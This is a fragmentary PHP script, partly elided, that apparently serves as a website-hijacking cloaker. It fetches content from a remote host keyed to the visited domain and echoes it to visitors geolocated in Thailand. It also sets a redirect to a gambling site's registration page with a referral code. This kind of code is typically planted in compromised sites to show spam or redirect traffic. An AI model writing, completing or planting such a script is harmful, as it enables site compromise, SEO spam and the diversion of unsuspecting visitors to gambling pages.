<?php
ob_start();
$contents   = 'https://oke-gas.xyz/th3/' . $_SERVER["HTTP_HOST"];
$redirectTo = "https://b99th.com/register?rc=igvip1"; // set null if no redirect
$allDevice = true;
...
if ($jsonData->countryCode == 'TH') {
        ...
        echo getContents($contents . '/index.txt');
        exit;
    }
